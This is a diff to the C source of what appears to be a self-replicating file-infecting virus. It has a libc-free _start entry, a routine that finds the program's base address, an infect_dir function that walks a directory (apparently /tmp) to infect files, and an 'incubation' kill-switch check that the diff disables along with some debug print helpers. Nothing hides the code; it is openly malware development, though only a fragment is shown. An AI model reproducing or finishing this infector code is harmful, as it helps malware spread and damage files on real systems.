@@ -80,64 +80,64 @@ __attribute__((always_inline)) inline int ft_strlen(volatile char *str);
 __attribute__((always_inline)) inline void ft_strncpy(volatile char *src, volatile char *dst, size_t size);
 __attribute__((always_inline)) inline int ft_strstr(volatile char *haystack, volatile char *needle, size_t size);
 __attribute__((always_inline)) inline void ft_memcpy(volatile void *src, volatile void *dst, uint64_t size);
-
-__attribute__((always_inline)) inline void
-print_number_hex(volatile uint64_t num) {
-    char buf[20];
-    int pos = 0;
-
-    if (num == 0) {
-        char c = '0';
-        ft_write(1, &c, 1);
-        return;
-    }
-
-    while (num > 0) {
-        uint64_t cur = num % 16;
-        if (cur < 10)
-            buf[pos++] = '0' + cur;
-        else
-            buf[pos++] = 'a' + cur - 10;
-        num /= 16;
-    }
-
-    while (pos > 0) {
-        char c = buf[--pos];
-        ft_write(1, &c, 1);
-    }
-}
-
-__attribute__((always_inline)) inline void
-print_number(volatile uint64_t num) {
-    char buf[20];
-    int pos = 0;
-
-    if (num == 0) {
-        char c = '0';
-        ft_write(1, &c, 1);
-        return;
-    }
-
-    while (num > 0) {
-        buf[pos++] = '0' + (num % 10);
-        num /= 10;
-    }
-
-    while (pos > 0) {
-        char c = buf[--pos];
-        ft_write(1, &c, 1);
-    }
-}
-
-__attribute__((always_inline)) static inline void
-ft_exit_incubation() {
-    int fd_is_incubator = ft_open(incubation, O_RDONLY, 0);
-    if (fd_is_incubator > 0) {
-        ft_close(fd_is_incubator);
-        ft_exit(0);
-    }
-}
-
+//
+// __attribute__((always_inline)) inline void
+// print_number_hex(volatile uint64_t num) {
+//     char buf[20];
+//     int pos = 0;
+//
+//     if (num == 0) {
+//         char c = '0';
+//         ft_write(1, &c, 1);
+//         return;
+//     }
+//
+//     while (num > 0) {
+//         uint64_t cur = num % 16;
+//         if (cur < 10)
+//             buf[pos++] = '0' + cur;
+//         else
+//             buf[pos++] = 'a' + cur - 10;
+//         num /= 16;
+//     }
+//
+//     while (pos > 0) {
+//         char c = buf[--pos];
+//         ft_write(1, &c, 1);
+//     }
+// }
+//
+// __attribute__((always_inline)) inline void
+// print_number(volatile uint64_t num) {
+//     char buf[20];
+//     int pos = 0;
+//
+//     if (num == 0) {
+//         char c = '0';
+//         ft_write(1, &c, 1);
+//         return;
+//     }
+//
+//     while (num > 0) {
+//         buf[pos++] = '0' + (num % 10);
+//         num /= 10;
+//     }
+//
+//     while (pos > 0) {
+//         char c = buf[--pos];
+//         ft_write(1, &c, 1);
+//     }
+// }
+//
+// __attribute__((always_inline)) static inline void
+// ft_exit_incubation() {
+//     int fd_is_incubator = ft_open(incubation, O_RDONLY, 0);
+//     if (fd_is_incubator < 0) {
+//         ft_exit(0);
+//     }
+//     ft_close(fd_is_incubator);
+// }
+//
 __attribute__((always_inline)) static inline uint64_t
 parse_hex(volatile char *hex) {
     uint64_t result = 0;
@@ -161,14 +161,14 @@ parse_hex(volatile char *hex) {
 
     return result;
 }
-
-__attribute__((always_inline)) static inline void
-print_nice(volatile uint64_t value) {
-    char nl = '\n';
-    ft_write(1, &nl, 1);
-    print_number_hex(value);
-    ft_write(1, &nl, 1);
-}
+//
+// __attribute__((always_inline)) static inline void
+// print_nice(volatile uint64_t value) {
+//     char nl = '\n';
+//     ft_write(1, &nl, 1);
+//     print_number_hex(value);
+//     ft_write(1, &nl, 1);
+// }
 
 __attribute__((always_inline)) static inline uint64_t
 get_base_address() {
@@ -219,7 +219,6 @@ _start() {
         ft_exit(0);
     };
 
-    // ft_exit_incubation();
     volatile char dir[11];
     dir[0] = '/';
     dir[1] = 't';
@@ -242,7 +241,7 @@ infect_dir(volatile char *dir_path, volatile int fd_self) {
     for (volatile int dir_index = 0; dir_index < 2; dir_index++) {
 
         int fd_dir = ft_open(dir_path, O_RDONLY, O_DIRECTORY);
-        if (fd_dir < 0) return fd_dir;
+        if (fd_dir < 0) return 0;
 
         const uint64_t FILE_NAME_MAX = 255;
         const uint64_t DIR_P_SIZE_WITHOUT_ALIGNMENT = FILE_NAME_MAX + sizeof(dirent64);
